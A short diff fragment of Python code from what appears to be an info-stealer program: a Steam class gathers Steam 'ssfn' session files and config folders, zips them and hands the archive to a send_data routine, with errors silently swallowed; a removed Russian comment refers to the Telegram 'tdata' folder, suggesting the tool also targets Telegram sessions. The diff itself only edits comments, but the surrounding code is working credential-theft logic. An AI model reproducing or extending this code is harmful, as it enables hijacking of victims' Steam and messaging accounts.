@@ -415,7 +415,7 @@ class Steam:
 	@staticmethod
 	def main():
 		try:
-			files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and 'ssfn' in i]
+			files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and 'ssfn' in i] # 
 			shutil.copytree(path02, directory_config)
 			shutil.copy(path2+'\\'+files2[0], steam_path)
 			shutil.copy(path2+'\\'+files2[1], steam_path)
@@ -427,7 +427,7 @@ class Steam:
 			shutil.copy(path3+'\\'+files3[1], steam_path)
 		except: pass
 
-		if len(os.listdir(steam_path)) > 1:  # если нет данных в папке tdata завершит работу
+		if len(os.listdir(steam_path)) > 1:
 			shutil.make_archive(steam_path, 'zip', steam_path)
 			with open(steam_path+'.zip', 'rb') as steam:
 				Support.send_data(steam, 'Steam')
